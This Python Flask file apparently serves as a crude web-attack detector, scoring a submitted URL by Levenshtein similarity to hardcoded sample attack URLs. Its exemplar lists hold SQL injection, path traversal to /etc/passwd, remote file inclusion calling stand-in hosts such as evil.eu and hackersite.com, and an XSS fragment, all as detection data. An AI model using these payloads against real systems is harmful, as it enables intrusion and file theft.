
import matplotlib.pyplot as plt
from flask import Flask, jsonify, request
from flask_cors import CORS, cross_origin
import pickle
import pandas as pd


import numpy as np
import sklearn.cluster
import distance
import re

#implement an api where burak can send request and compare between string he sent and my array of levensthain distance

app = Flask(__name__)
examplarInj = ["/core/files/js/upload.js/?id=0%20or%201=1", "/xmlrpc.php/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1", "/?customerId=1OR%201=1" ]


examplarLfi = ["/core/themes/theme.inc/?page=/../../../../../../etc/passwd", "/blog/better-products-for-2019/../../../file:///etc/passwd?", "//core/files/js/editor.js/../../../file:///etc/passwd?", "/login.php/../../../file:///etc/passwd?" ]


examplarXss =  ["/cgi-bin/count.cgi/?file=http://evil.eu/root.asp", "/xmlrpc.php/?post=%3script>alert(1);", "/core/files/js/editor.js/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?", "/xmlrpc.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php" ]

@app.route('/analyze')
def analyze():
    url = request.args.get('url')
    result = compareAgainst(url)
    # if result:
    #     pass
    # else:
    #     pass
    return str(result)



def compareAgainst(url):
    median = 0
    sum = 0
    for element in examplarInj:
        Distance = levenshtein_ratio_and_distance(url, element, ratio_calc=True)
        sum += Distance
    # Distance = levenshtein_ratio_and_distance(url, examplarInj[0], ratio_calc=True)
    return sum/4.0


def levenshtein_ratio_and_distance(s, t, ratio_calc = False):

    #init zeros
    rows = len(s)+1
    cols = len(t)+1
    distance = np.zeros((rows,cols),dtype = int)

    # Populate matrix of zeros with the indeces of each character of both strings
    for i in range(1, rows):
        for k in range(1,cols):
            distance[i][0] = i
            distance[0][k] = k

    # Iterate over the matrix to compute the cost of deletions,insertions and/or substitutions
    for col in range(1, cols):
        for row in range(1, rows):
            if s[row-1] == t[col-1]:
                cost = 0 # If the characters are the same in the two strings in a given position [i,j] then the cost is 0
            else:
                # In order to align the results with those of the Python Levenshtein package, if we choose to calculate the ratio
                # the cost of a substitution is 2. If we calculate just distance, then the cost of a substitution is 1.
                if ratio_calc == True:
                    cost = 2
                else:
                    cost = 1
            distance[row][col] = min(distance[row-1][col] + 1,      # Cost of deletions
                                 distance[row][col-1] + 1,          # Cost of insertions
                                 distance[row-1][col-1] + cost)     # Cost of substitutions
    if ratio_calc == True:
        # Computation of the Levenshtein Distance Ratio
        Ratio = ((len(s)+len(t)) - distance[row][col]) / (len(s)+len(t))
        return Ratio
    else:
        # print(distance) #

        return "{} away".format(distance[row][col])



